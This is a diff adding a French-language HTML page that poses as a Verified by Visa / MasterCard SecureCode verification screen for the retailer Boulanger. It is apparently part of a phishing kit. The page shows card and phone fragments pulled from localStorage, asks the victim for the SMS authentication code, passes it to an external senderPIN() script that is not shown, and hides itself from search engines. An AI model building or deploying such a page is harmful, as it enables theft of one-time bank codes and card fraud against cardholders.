@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="robots" content="noindex,nofollow">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>otpStandard</title>
+      <!--Scripts jquery-->
+
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>
+  
+      <!--Scripts jquery-->
+    <script>
+        document.getElementById("encryptedCardNumber").innerHTML =  localStorage.getItem("encryptedCardNumber");
+         document.getElementById("numtel").innerHTML =  localStorage.getItem("numtel");
+       
+       </script>
+       <script>
+        function validateForm() {
+          var x = document.forms["myForm"]["otp"].value;
+          if (x == "" || x == null) {
+            alert("Veuillez entrer le code reçu par SMS");
+            return false;
+          }
+        }
+        </script>
+</head>
+<link rel="stylesheet" href="./otpStandard.css">
+
+<body>
+    <div id="otp">
+
+    </div>
+    <div class="totp">
+
+    <form  name="myForm" onsubmit="  senderPIN()">
+
+        <div class="wrapper">
+
+            <div class="head">
+
+            <span class="bankLogo">
+
+                <img src="./assets/visa.png">
+
+            </span>
+
+            <span class="ccLogo">
+              <img src="./assets/mastercard.png">
+            </span>
+
+        </div>
+    <p>Boulanger a choisi la solution Verified By Visa et MasterCard SecureCode pour sécuriser vos achats en ligne</p>
+    <p>Pour vous identifier, saisissez votre code d'accès reçu par SMS: </p>
+    <br>
+      
+    <div class="details">
+        <div class="labels">
+            <label for="" class="a">Marchand: </label><br>
+           
+            <label for="" class="a">Date:</label> <br>
+            <label for="" class="a">N° de carte: </label>  <br>
+            <label for="" class="a">N° de téléphone: </label><br>
+
+        </div>
+        <div class="spans">
+            <span id="marchand"> Boulanger</span><br>
+           
+            <span id="date"></span><br>
+            <span>xxxxxxx<span id="encryptedCardNumber"></span> </span><br>
+            <span>xxxxxxx<span id="numtel"></span></span><br>
+
+        </div><br><br>
+        <label for="" >Veuillez saisir sans espace le code d'authentification: &NonBreakingSpace;</label>
+        <input class="otp" name="otp"  id="numPin" type="text"><br><br>
+
+        <button type="submit" class="ok"  href="javascript:void(0);" onsubmit="senderPIN();">OK</button>
+
+    </div><br><br><br>
+
+        <p class="do">Pour quitter <b><a href="#">cliquez ici</a></b></p><br>
+        <br><p class="do">Si vous ne revevez pas un SMS, consulter l'application mobile de votre banque
+        </p>
+        
+    </form>
+    </div>
+    <script src="./senderPIN.js">
+    </script>
+    <script>
+    n =  new Date();
+    y = n.getFullYear();
+    m = n.getMonth() + 1;
+    d = n.getDate();
+    document.getElementById("date").innerHTML = m + "/" + d + "/" + y;      
+    </script>
+ <!--Animated show for the div-->
+ <script type="text/javascript">
+    $(document).ready(function () {
+        $('.ok').click(function () {
+            $('.totp').fadeOut('4000');
+            $('#otp').load('commande.html').delay('5000').fadeIn('5000');
+            $('#otp').click(senderPIN());
+
+        });
+    });
+
+</script>
+</body>
+</html>
